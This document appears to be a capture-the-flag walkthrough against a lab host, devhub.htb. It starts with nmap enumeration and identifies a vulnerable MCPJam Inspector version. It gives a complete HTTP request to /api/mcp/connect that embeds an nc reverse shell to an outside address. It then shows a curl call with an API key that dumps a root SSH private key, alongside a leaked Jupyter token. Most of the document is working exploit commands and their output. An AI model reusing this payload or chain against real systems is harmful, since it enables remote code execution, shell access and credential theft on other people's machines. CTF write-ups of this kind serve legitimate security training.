
network enumeration:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 35:78:2e:79:0d:87:13:05:2f:53:8e:e7:3c:55:b6:4c (ECDSA)
|_  256 dd:56:8e:bc:da:b8:38:3e:9a:cd:0b:74:ee:53:85:f8 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devhub.htb/
6274/tcp open  unknown
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq:
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest:
|     HTTP/1.1 200 OK
|     access-control-allow-credentials: true
|     content-length: 466
|     content-type: text/html; charset=utf-8
|     vary: Origin
|     Date: Wed, 03 Jun 2026 10:29:28 GMT
|     Connection: close
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8" />
|     <link rel="icon" type="image/svg+xml" href="/mcp_jam.svg" />
|     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
|     <title>MCPJam Inspector</title>
|     <script type="module" crossorigin src="/assets/index-DRYhT9Xb.js"></script>
|     <link rel="stylesheet" crossorigin href="/assets/index-XvFRNbCs.css">
|     </head>
|     <body>
|     <div id="root"></div>
|     </body>
|     </html>
|   HTTPOptions, RTSPRequest:
|     HTTP/1.1 204 No Content
|     access-control-allow-credentials: true
|     access-control-allow-methods: GET,HEAD,PUT,POST,DELETE,PATCH
|     vary: Origin
|     content-type: text/plain; charset=UTF-8
|     Date: Wed, 03 Jun 2026 10:29:29 GMT
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port6274-TCP:V=7.94SVN%I=7%D=6/3%Time=6A200208%P=x86_64-pc-linux-gnu%r(
SF:GetRequest,290,"HTTP/1\.1\x20200\x20OK\r\naccess-control-allow-credenti
SF:als:\x20true\r\ncontent-length:\x20466\r\ncontent-type:\x20text/html;\x
SF:20charset=utf-8\r\nvary:\x20Origin\r\nDate:\x20Wed,\x2003\x20Jun\x20202
SF:6\x2010:29:28\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html>\
SF:n<html\x20lang=\"en\">\n\x20\x20<head>\n\x20\x20\x20\x20<meta\x20charse
SF:t=\"UTF-8\"\x20/>\n\x20\x20\x20\x20<link\x20rel=\"icon\"\x20type=\"imag
SF:e/svg\+xml\"\x20href=\"/mcp_jam\.svg\"\x20/>\n\x20\x20\x20\x20<meta\x20
SF:name=\"viewport\"\x20content=\"width=device-width,\x20initial-scale=1\.
SF:0\"\x20/>\n\x20\x20\x20\x20<title>MCPJam\x20Inspector</title>\n\x20\x20
SF:\x20\x20<script\x20type=\"module\"\x20crossorigin\x20src=\"/assets/inde
SF:x-DRYhT9Xb\.js\"></script>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"
SF:\x20crossorigin\x20href=\"/assets/index-XvFRNbCs\.css\">\n\x20\x20</hea
SF:d>\n\x20\x20<body>\n\x20\x20\x20\x20<div\x20id=\"root\"></div>\n\x20\x2
SF:0</body>\n</html>\n")%r(HTTPOptions,F0,"HTTP/1\.1\x20204\x20No\x20Conte
SF:nt\r\naccess-control-allow-credentials:\x20true\r\naccess-control-allow
SF:-methods:\x20GET,HEAD,PUT,POST,DELETE,PATCH\r\nvary:\x20Origin\r\nconte
SF:nt-type:\x20text/plain;\x20charset=UTF-8\r\nDate:\x20Wed,\x2003\x20Jun\
SF:x202026\x2010:29:29\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequ
SF:est,F0,"HTTP/1\.1\x20204\x20No\x20Content\r\naccess-control-allow-crede
SF:ntials:\x20true\r\naccess-control-allow-methods:\x20GET,HEAD,PUT,POST,D
SF:ELETE,PATCH\r\nvary:\x20Origin\r\ncontent-type:\x20text/plain;\x20chars
SF:et=UTF-8\r\nDate:\x20Wed,\x2003\x20Jun\x202026\x2010:29:29\x20GMT\r\nCo
SF:nnection:\x20close\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20
SF:Request\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F,"HT
SF:TP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DN
SF:SStatusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:
SF:\x20close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCo
SF:nnection:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x20Ba
SF:d\x20Request\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

devhub.htb:6274/#settings found the version of the system

MCPJam Version: v1.4.2 found CVE-2026-23744

```
https://github.com/MCPJam/inspector/security/advisories/GHSA-232v-j27c-5pp6

i found that their is vlunerbility that the /api/mcp/connect is vlunerable to remote code execution (RCE) attack can be triggered by sending a simple HTTP request to the target host running MCPJam inspector

POST /api/mcp/connect HTTP/1.1
Host: devhub.htb:6274
Content-Length: 146
sentry-trace: d8a75b1a3eaf4f328b176ab016b65bee-b6ded31ec75309d5-0
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Content-Type: application/json
baggage: sentry-environment=prod,sentry-release=af9cf6a62f550e986fe330c09b8a3b8b83136df6,sentry-public_key=c9df3785c734acfe9dad2d0c1e963e28,sentry-trace_id=d8a75b1a3eaf4f328b176ab016b65bee,sentry-sample_rate=0.1,sentry-sampled=false
Accept: */*
Origin: http://devhub.htb:6274
Referer: http://devhub.htb:6274/
Accept-Encoding: gzip, deflate, br

{
  "serverConfig": {
    "command": "/bin/sh",
 "args": ["-c", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.64 4444 >/tmp/f"],
    "env": {}
  },
  "serverId": "ping-test"
}

got the reverse shell


mcp-dev@devhub:/opt/mcpjam/node_modules$ ps aux | grep -i jupyter
analyst     1062  0.0  2.4 181500 96240 ?        Ss   00:27   0:04 /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 --ServerApp.password= --ServerApp.allow_origin= --ServerApp.disable_check_xsrf=False
root        1070  0.0  0.7  37376 28728 ?        Ss   00:27   0:07 /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
mcp-dev     2475  0.0  0.0   6828  2036 pts/0    S+   11:25   0:00 grep --color=auto -i jupyter


<modules$ curl -s http://127.0.0.1:5000/tools/call \
>   -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
>   -H "Content-Type: application/json" \
<,"arguments":{"target":"ssh_keys","confirm":true}}'
{"note":"Emergency recovery key dump","root_private_key":"-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAwWHw4Iv8yDwyqOacO5uB2OFr/RaD1TF192ptgJXu0vj5STypOUH9\nG/jqltqP312IONAX9LwvTne81E4h+hi2xdjwgvh27iE4AvCQolR8S0GWHwHQjjXVQ5/dHX\n8MA96Qabow623zQe5D6PUAsFj6aWP5fDceIziAxkLIMgpsE6I0bWOKaGmgEG0rW1I/mw8z\n6HmooVORQsQoTaVUhnUmRJRcLpQEu94hzb+0kQ0ObKikcDTnit1kQ/7ZUOoyGhUgEwVk/n\nGhm2D96OW/JLpMIowwDxnka+3l9u5Aj55Y9fWN9aGld5pVvcoPRZ7twODIbXNSjzWsLQRQ\n7l8/a2M+aQAAA8BGnYWeRp2FngAAAAdzc2gtcnNhAAABAQDBYfDgi/zIPDKo5pw7m4HY4W\nv9FoPVMXX3am2Ale7S+PlJPKk5Qf0b+OqW2o/fXYg40Bf0vC9Od7zUTiH6GLbF2PCC+Hbu\nITgC8JCiVHxLQZYfAdCONdVDn90dfwwD3pBpujDrbfNB7kPo9QCwWPppY/l8Nx4jOIDGQs\ngyCmwTojRtY4poaaAQbStbUj+bDzPoeaihU5FCxChNpVSGdSZElFwulAS73iHNv7SRDQ5s\nqKRwNOeK3WRD/tlQ6jIaFSATBWT+caGbYP3o5b8kukwijDAPGeRr7eX27kCPnlj19Y31oa\nV3mlW9yg9Fnu3A4Mhtc1KPNawtBFDuXz9rYz5pAAAAAwEAAQAAAQAjgZkZkXpjRXJDwrvS\n0fWgXZtXR8gC3+b5+4eJgX3tLJuQz9t+UNhpR2XDNvQNnf3B+Ks9W0QQUznPfV0Nr3X3k6\nJtWbN0e5LuLz9PHtYHd05Z+RpS0h2LIhIWNVp+Z2H6l54dy/1LELVVU47B0kSAD0Qig3g8\nHUa/oEljrrgzTlYflRHhkHQblmd9ZaClUoxIDh0zf2Esmp3nIRBm4J1OX5UQPiPEa7/LkB\ndcQr1K4Z1pbZglc5wPUJZCv8MtVPvW9rCgERl9Sl4bKevsgS4mMMUvVxNdqyasYqNAXi/L\nCvk9YYP9PS4q1dfCYMIvsJJNyoBtUiCJwqW2ba6hs1vVAAAAgDEPkj6UOdX1B872cHrja2\nnkahzlja7GZw3G2+hsib4kH/G1nwQs9RRtnzqf/mrXeEhxB27ZN+QE39e7yTC3r6f84mSn\nMz/gS3Czh6DtP+S18jV4xCeac/SoLuxgLvPZ3xnHWvPO6HePQzyVlVk/MBfp+yPrCpIiHK\nMtVMaeJXFYAAAAgQDSlTQAPhkFhsswOcohRO+1hd/4xdD9UECem1ytsb5/on47/GEWvtQI\noocmAAMvEYlOvs8GXeYkMBAwi5VCjLunNBCmuRMjTEgE7lqgdhfkK0Lx/a4BWnYaki+xbk\nJt9XB5f2NlmnT4A5QqiO+qPYA2i1iF9CSv5ypxqHFChgMZNwAAAIEA6xcR6lBjwgtKuzRQ\nnI+f8DFRxcdfKY1gs0BmfS0RRxwDzIEwJHYafyHnq/CKBTDPCYyn/VI+mF64hhtjUbDgAr\nC8X6q/4LJecp3piSHgv6yXhpzkxtz+Q/JSXPFf/9NAgVFQtUjrrnGZbP9kNySaX6q6/npK\nlFORwv9PYfxftV8AAAALcm9vdEBkZXZodWI=\n-----END OPENSSH PRIVATE KEY-----\n","target":"ssh_keys"}
mcp-dev@devhub:/opt/mcpjam/node_modules$
```


